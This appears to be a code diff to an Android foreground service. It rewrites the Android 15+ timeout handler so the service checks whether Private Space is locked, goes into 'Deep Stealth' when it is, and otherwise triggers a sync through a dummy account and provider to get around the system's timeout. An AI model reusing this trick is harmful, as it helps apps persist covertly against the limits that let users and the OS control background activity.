@@ -102,12 +102,41 @@ public class mainService extends Service {
         stopSelf();
     }
 
-    // Android 15 specific: Handle system-enforced timeouts
+    // Android 15/16 specific: Handle system-enforced timeouts
     public void onTimeout(int startId, int fgsType) {
-        if (android.os.Build.VERSION.SDK_INT >= 35) { // android.os.Build.VERSION_CODES.VANILLA_ICE_CREAM
+        if (android.os.Build.VERSION.SDK_INT >= 35) { 
             if (fgsType == android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) {
-                Log.w(TAG, "Android 15 timeout reached! Emergency shutdown.");
-                stopPulse();
+                Log.w(TAG, "Android 15+ timeout reached. Engaging Handoff Logic.");
+                try {
+                    // Check Android 16 Private Space Status
+                    android.os.UserManager um = (android.os.UserManager) getSystemService(android.content.Context.USER_SERVICE);
+                    boolean isLocked = false;
+                    
+                    if (android.os.Build.VERSION.SDK_INT >= 30) {
+                        for (android.os.UserHandle handle : um.getUserProfiles()) {
+                            if (um.isQuietModeEnabled(handle)) {
+                                isLocked = true;
+                                break;
+                            }
+                        }
+                    }
+
+                    if (isLocked) {
+                        Log.d(TAG, "Private Space locked. Entering Deep Stealth.");
+                        // Let the system kill the service silently, no wake-up alarms.
+                    } else {
+                        Log.d(TAG, "Space active. Triggering Emergency Sync Handoff.");
+                        android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
+                        android.accounts.Account[] accounts = am.getAccountsByType(DummyAuthenticator.ACCOUNT_TYPE);
+                        if (accounts.length > 0) {
+                            android.content.ContentResolver.requestSync(accounts[0], DummyProvider.AUTHORITY, new android.os.Bundle());
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Handoff failed: " + e.getMessage());
+                } finally {
+                    stopPulse();
+                }
             }
         }
     }
